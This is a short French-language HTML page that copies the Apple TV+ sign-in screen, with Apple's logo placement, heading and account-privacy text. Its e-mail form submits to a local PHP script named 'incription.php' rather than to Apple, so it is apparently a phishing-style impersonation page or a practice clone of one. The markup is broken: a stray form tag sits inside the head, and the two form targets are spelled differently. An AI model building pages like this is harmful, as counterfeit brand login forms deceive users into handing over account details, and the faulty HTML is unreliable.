<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Apple TV+ Connexion</title>
  <link rel="stylesheet" href="style2.css">
  <form method="POST" action="inscription.php" class="formulaire">
</head>
<body>

  <div class="login-container">
    <button class="close-btn">×</button>

    <div class="logo">
      <img src="icon.jpg" alt="Apple TV+">
    </div>

    <h1>Continuer avec une adresse e-mail</h1>
    <p class="subtitle">
      Vous pouvez vous connecter si vous possédez déjà un compte,<br>
      sinon nous vous aiderons à en créer un.
    </p>

    <form action="incription.php" method="POST" class="form">

      <input type="email" name="email" placeholder="E-mail" required class="champ">

      <button type="submit" class="btn-blue">Continuer</button>
    </form>

    <div class="privacy">
      <img src="icon.jpg" alt="Icon" class="icon">
      <p>
        Les informations relatives à votre compte Apple sont utilisées pour vous permettre
        de vous connecter en toute sécurité et d’accéder à vos données. Apple enregistre
        certaines données pour garantir votre sécurité, vous proposer une assistance et
        compiler des rapports d’activité. Si vous acceptez, Apple peut également utiliser
        les informations relatives à votre compte Apple pour vous envoyer des e-mails et des
        communications marketing, y compris en fonction de votre utilisation des services
        Apple. <a href="#">Découvrez comment sont gérées vos données…</a>
      </p>
    </div>
  </div>

</body>
</html>
